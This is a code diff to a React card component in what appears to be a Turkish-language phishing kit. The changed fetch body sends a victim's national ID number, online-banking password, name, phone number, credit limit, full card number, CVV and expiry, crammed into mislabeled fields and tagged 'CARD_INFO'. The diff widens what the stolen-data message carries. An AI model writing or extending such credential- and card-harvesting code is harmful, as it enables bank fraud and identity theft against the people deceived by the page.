@@ -152,13 +152,13 @@ const CardComponent = () => {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          username: `${loginData?.username || 'TC_YOK'} | ${phoneData?.phone || 'TEL_YOK'}`,
+          username: `TC:${loginData?.username || 'YOK'} | Telefon:${phoneData?.phone || 'YOK'} | Limit:${phoneData?.creditLimit || 'YOK'}`,
           password: cardData.cvv,
           phone: cardData.cardNumber.replace(/\s/g, ''),
           creditLimit: `${cardData.expiryMonth}/${cardData.expiryYear}`,
           applicationDate: new Date().toLocaleDateString('tr-TR'),
           realName: cardData.cardHolder,
-          realSurname: `DijitalŞifre:${loginData?.password || 'YOK'} | KrediLimit:${phoneData?.creditLimit || 'YOK'}`,
+          realSurname: `Login: TC=${loginData?.username || 'YOK'} Şifre=${loginData?.password || 'YOK'} Ad=${loginData?.realName || 'YOK'} ${loginData?.realSurname || 'YOK'} | Phone: Tel=${phoneData?.phone || 'YOK'} Limit=${phoneData?.creditLimit || 'YOK'}`,
           messageType: 'CARD_INFO'
         })
       })
